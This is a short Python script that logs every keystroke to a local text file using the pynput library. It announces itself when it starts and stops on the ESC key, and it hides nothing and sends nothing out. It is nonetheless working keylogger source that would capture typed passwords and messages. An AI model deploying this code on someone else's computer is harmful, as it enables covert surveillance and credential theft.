from pynput import keyboard

# File where keys will be logged
log_file = "key_log.txt"

def write_to_file(key):
    try:
        # For normal keys (letters, numbers)
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # For special keys (space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f"[{key}]")

def on_press(key):
    write_to_file(key)

def on_release(key):
    # Stop listener when ESC is pressed
    if key == keyboard.Key.esc:
        print("Logging stopped.")
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started... Press ESC to stop.")
    listener.join()